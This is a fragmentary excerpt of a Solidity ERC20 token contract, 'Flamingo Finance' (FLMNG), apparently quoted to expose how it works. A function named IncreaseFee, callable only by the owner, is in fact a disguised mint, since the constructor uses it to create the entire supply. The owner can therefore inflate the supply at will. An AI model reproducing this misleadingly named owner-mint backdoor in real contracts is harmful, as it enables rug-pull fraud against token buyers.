...
contract Ownable is Context {
    ...
    function BurningFees() public virtual {
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function IncreaseFee(uint256 amount) public onlyOwner {
    _IncreaseFee(msg.sender, amount);
    }
    ...
    function _IncreaseFee(address account, uint256 amount) internal virtual {
...
contract Flamingo is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("Flamingo Finance", "FLMNG") {
        _IncreaseFee(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}